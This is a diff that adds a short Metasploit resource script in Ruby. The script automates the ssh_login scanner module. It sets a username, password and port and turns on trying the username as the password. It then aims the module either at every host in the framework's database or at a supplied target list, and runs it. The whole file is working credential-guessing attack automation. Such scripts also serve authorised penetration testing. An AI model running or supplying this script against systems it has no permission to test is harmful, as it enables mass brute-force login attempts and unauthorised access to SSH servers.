@@ -1,0 +1,41 @@
+<ruby>
+
+# Test and see if we have a database connected
+begin
+	framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+	print_error("Database connection isn't established")
+	return
+end
+
+
+begin
+	run_single("use auxiliary/scanner/ssh/ssh_login")
+	run_single("set USERNAME #{framework.datastore["ssh_username"]}")
+	run_single("set PASSWORD #{framework.datastore["ssh_password"]}")
+	run_single("set USER_AS_PASS true")
+	run_single("set RPORT #{framework.datastore["ssh_port"]}")
+
+	if framework.datastore["full_automatic"]
+		print_line("---- RUNNING FULL AUTOMATIC ----")
+		rhosts = ""
+		for host in framework.db.hosts
+			rhosts.concat(host.address + " ")
+		end
+		run_single("set RHOSTS #{rhosts}")
+	else
+		print_line("---- RUNNING ON TARGETS ----")
+		rhosts = ""
+		for i in framework.datastore["targets"]
+			rhosts.concat(i + " ")
+		end
+		run_single("set RHOSTS #{rhosts}")
+	end
+
+	run_single("exploit")
+rescue Msf::Exception
+	print_error("Exception in ssh_login_LP")
+	return
+end
+
+</ruby>
